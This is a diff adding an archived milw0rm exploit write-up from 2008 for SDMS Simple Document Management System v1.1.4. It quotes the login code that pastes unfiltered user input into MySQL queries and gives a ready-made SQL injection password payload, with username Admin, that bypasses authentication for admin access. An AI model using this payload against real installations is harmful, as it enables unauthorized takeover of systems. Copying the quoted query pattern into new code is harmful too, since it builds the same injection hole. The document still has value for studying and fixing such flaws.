@@ -1,0 +1,52 @@
+SDMS Simple Document Management System v1.1.4 SQL Injection
+___________________________________________________________________________
+
+	Author: Yuri
+
+
+	Program: SDMS Simple Document Management System
+	Version: v1.1.4 (and probably all older versions as well)
+	Website: http://sdms.cafuego.net/
+
+
+How it works
+___________________________________________________________________________
+The login system is very insecure, this is the code we are going to abuse:
+
+	$result = @mysql_query("SELECT pass != PASSWORD('$pass') FROM users WHERE user='$login'");
+
+	$row = @mysql_fetch_array($result);
+
+	if( $row[0] != 0 ) {
+
+		header("Location: index.php");
+
+		exit;
+
+	}
+
+	$result = @mysql_query("SELECT id,name FROM users WHERE user='$login'");
+	$row = @mysql_fetch_array($result);
+
+	$id = $row[id];
+
+	$name = $row[name];
+
+If the result of the first query is 0, it selects the id and name from the
+user entered at the login page. There is no filter on $pass.
+
+So if we enter 
+	user: Admin (case insensitive)
+	password: ') FROM users WHERE id=-1 UNION SELECT 0 FROM users --
+
+The resulting query looks like this:
+
+	SELECT pass != PASSWORD('') FROM users WHERE id=-1 UNION SELECT 0 FROM users --') FROM users WHERE user='$login'
+
+which is always 0, so voila, admin access.
+
+___________________________________________________________________________
+
+						Yuri // 04 - 11 - 2008
+
+# milw0rm.com [2008-11-04]
